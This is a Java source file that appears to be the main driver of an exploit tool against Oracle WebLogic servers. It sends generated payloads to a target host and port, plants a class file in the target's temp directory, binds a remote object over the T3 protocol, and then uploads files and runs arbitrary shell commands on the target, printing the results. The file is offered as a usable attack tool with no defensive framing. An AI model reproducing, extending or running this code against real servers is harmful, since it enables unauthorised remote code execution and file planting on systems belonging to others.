package org.secdomain.exp;

import javax.naming.InitialContext;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.text.NumberFormat;
import java.util.Arrays;
import java.util.Hashtable;

public class Main {
    private static RemoteObject remote;
    private static String host = "";
    private static String port = "";
    private static String files = "";
    private static String cmd = "";
    private static boolean upload(String files) {
        FileInputStream fileInputStream = null;
        File file = new File(files);
        boolean rst = false;
        try {
            fileInputStream = new FileInputStream(file);
            long total = file.length();
            byte[] data = new byte[102400];
            double sendedLen = 0.0D;
            NumberFormat nf = NumberFormat.getPercentInstance();
            int len = fileInputStream.read(data);
            if(len != -1) {
                if(remote.upload(files, Arrays.copyOfRange(data, 0, len), false)) {
                    sendedLen += (double)len;
                    System.out.println("上传中...已完成" + nf.format(sendedLen / (double)total));

                    while((len = fileInputStream.read(data)) != -1) {
                        if(!remote.upload(files, Arrays.copyOfRange(data, 0, len), true)) {
                            System.out.println("上传失败！");
                            break;
                        }

                        sendedLen += (double)len;
                        System.out.println("上传中...已完成" + nf.format(sendedLen / (double)total));
                    }

                    if(len == -1) {
                        System.out.println("上传成功！");
                        rst = true;
                    }
                } else {
                    System.out.println("上传失败！");
                }
            } else {
                System.out.println("上传失败！");
            }
            fileInputStream.close();
        } catch (java.io.IOException e1) {
            e1.printStackTrace();
        }
        return rst;
    }
    private static void helper(){
        System.out.println("Usage:\n\tjava -jar xxx.jar -h [host] -p [port] {options -f \"uploadfile.txt\" -c \"ls -l\"}\n\tWindows use commandline need \"cmd /c\" \n");
    }
    private static void usage(String[] args) {

        for (int i=0;i<args.length;i++) {
            //host arg
            if (args[i].compareToIgnoreCase("-h") ==  0) {
                host = args[++i];
                //System.out.println("host:"+args[++i]) ;
            }
            //port arg
            if (args[i].compareToIgnoreCase("-p") ==  0) {
                port = args[++i];
                //System.out.println("port:"+args[++i]) ;
            }
            //upload file arg
            if (args[i].compareToIgnoreCase("-f") ==  0) {
                files = args[++i];
               //System.out.println("file:"+args[++i]) ;
            }
            //commandline arg
            if (args[i].compareToIgnoreCase("-c") ==  0) {
                cmd = args[++i];
               // System.out.println("cmd:"+args[++i]) ;
            }
        }
    }
    public static void main(String[] args) {
	// write your code here
        if(args.length == 0 || args.length < 2){
            helper();
            return ;
        }

        String remoteWindowsPath = "/c:/windows/temp/sedomain.tmp";
        String remoteLinuxPath = "/tmp/sedomain.tmp";
        String remoteWindowsClassPath = "file:/c:/windows/temp/sedomain.tmp";
        String remoteLinuxClassPath = "file:/tmp/sedomain.tmp";
        String rst = "error";

        try {
            usage(args);
            if(host.isEmpty() || port.isEmpty()){
                helper();
                return;
            }
            (new SendPayload()).send(host, Integer.parseInt(port), Payload.generateRemotePayload(remoteWindowsPath));
            (new SendPayload()).send(host, Integer.parseInt(port), Payload.generateBindPayload(remoteWindowsClassPath));
            (new SendPayload()).send(host, Integer.parseInt(port), Payload.generateRemotePayload(remoteLinuxPath));
            (new SendPayload()).send(host, Integer.parseInt(port), Payload.generateBindPayload(remoteLinuxClassPath));

            if(!files.isEmpty()){
                upload(files);
            }

            if(!cmd.isEmpty()){
                Hashtable e = new Hashtable();
                e.put("java.naming.factory.initial", "weblogic.jndi.WLInitialContextFactory");
                e.put("java.naming.provider.url", "t3://" + host + ":" + port);
                InitialContext ctx = new InitialContext(e);
                remote = (RemoteObject)ctx.lookup("RemoteObject");

                rst = remote.exec(cmd);
                if("error".equals(rst)) {
                    System.out.println("执行失败!");
                } else {
                    System.out.println("\n=======================\n"+rst+"\n=======================\n");
                }
            }
            remote.unbind(remoteWindowsPath);
            remote.unbind(remoteLinuxPath);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
